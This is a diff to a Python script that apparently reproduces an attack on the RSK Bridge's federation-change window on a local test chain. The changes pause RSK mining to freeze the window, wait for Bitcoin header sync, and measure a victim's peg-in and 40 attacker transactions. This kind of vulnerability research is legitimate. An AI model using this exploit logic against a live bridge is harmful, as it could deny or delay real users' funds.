@@ -523,11 +523,21 @@ def stage_federation():
     log("[federation] waiting for the new federation to activate (150 blocks)")
     end = time.time() + 900
     retiring = ""
+    last_print = 0
     while time.time() < end:
         raw = dec_bytes("0x" + bridge_call(sel("getRetiringFederationAddress()")).hex()).decode(errors="ignore")
         if raw:
             retiring = raw
             break
+        now = time.time()
+        if now - last_print > 20:
+            last_print = now
+            try:
+                blk = int(rsk("eth_blockNumber"), 16)
+                act = dec_bytes("0x" + bridge_call(sel("getFederationAddress()")).hex()).decode(errors="ignore")
+                log("             block %d, active=%s, retiring=<not yet>" % (blk, act))
+            except Exception:
+                pass
         time.sleep(2)
     if not retiring:
         raise RuntimeError("the retiring federation never appeared; the change did not go through")
@@ -548,12 +558,8 @@ def stage_federation():
     })
     save_state(st)
 
-    # freeze the window while the powpeg node starts up
-    try:
-        rsk("evm_stopMining")
-        log("[federation] mining paused so the window does not burn during setup")
-    except Exception as e:
-        log("[federation] evm_stopMining unavailable (%s); continuing" % e)
+    log("[federation] the window is open: the retiring federation stays live for")
+    log("             150 blocks after activation, plus 150 more of migration")
 
 
 # ---------------------------------------------------------------------------
@@ -573,8 +579,22 @@ def mine(n):
     return addr
 
 
+def btc_best_chain_height() -> int:
+    raw = bridge_call(sel("getBtcBlockchainBestChainHeight()"))
+    return int.from_bytes(raw[:32], "big")
+
+
 def stage_attack():
     st = load_state()
+
+    # stop RSK block production so the retiring federation cannot expire while we
+    # prepare the transactions; Bitcoin mining keeps running, it is independent
+    try:
+        rsk("evm_stopMining")
+        log("[attack] RSK mining paused: the federation-change window is frozen")
+    except Exception as e:
+        log("[attack] evm_stopMining unavailable (%s); the window keeps running" % e)
+
     active = st["active_address"]
     retiring = st["retiring_address"]
     log("[attack] active   %s" % active)
@@ -667,6 +687,20 @@ def stage_attack():
     mine(BTC_CONFIRMATIONS + 2)
     log("[attack] %d BTC blocks mined" % (BTC_CONFIRMATIONS + 2))
 
+    # the Bridge only accepts a peg-in once it knows the header of its block, and
+    # the federator feeds it 25 headers per turn
+    target = btc("getblockcount")
+    log("[attack] waiting for the Bridge to catch up to BTC block %d" % target)
+    end = time.time() + 600
+    while time.time() < end:
+        h = btc_best_chain_height()
+        if h >= target:
+            log("[attack] Bridge BTC height is now %d" % h)
+            break
+        time.sleep(5)
+    else:
+        log("[attack] Bridge BTC height stuck at %d (target %d)" % (btc_best_chain_height(), target))
+
     try:
         rsk("evm_startMining")
         log("[attack] RSK mining resumed, the powpeg node is now under load")
@@ -703,6 +737,8 @@ def stage_measure(label="t"):
 
     out = {
         "label": label,
+        "rsk_block": int(rsk("eth_blockNumber"), 16),
+        "retiring_present": bool(dec_bytes("0x" + bridge_call(sel("getRetiringFederationAddress()")).hex()).decode(errors="ignore")),
         "victim_balance_wei": str(vic_bal),
         "victim_processed_height": vic_h,
         "attacker_processed": len(ah) - unprocessed,
@@ -711,6 +747,8 @@ def stage_measure(label="t"):
     }
     log("")
     log("  --- measurement (%s) ---" % label)
+    log("  RSK block                  %d   retiring fed live: %s"
+        % (out["rsk_block"], out["retiring_present"]))
     log("  victim  balance            %s wei" % out["victim_balance_wei"])
     log("  victim  processed height   %d  (-1 = never)" % vic_h)
     log("  attack  40 txs processed   %d" % out["attacker_processed"])
@@ -727,7 +765,10 @@ def stage_measure(label="t"):
 # ---------------------------------------------------------------------------
 
 def stage_recover():
-    st = load_state()
+    try:
+        rsk("evm_startMining")
+    except Exception:
+        pass
     log("[recover] waiting for the retiring federation to expire")
 
     end = time.time() + 1800
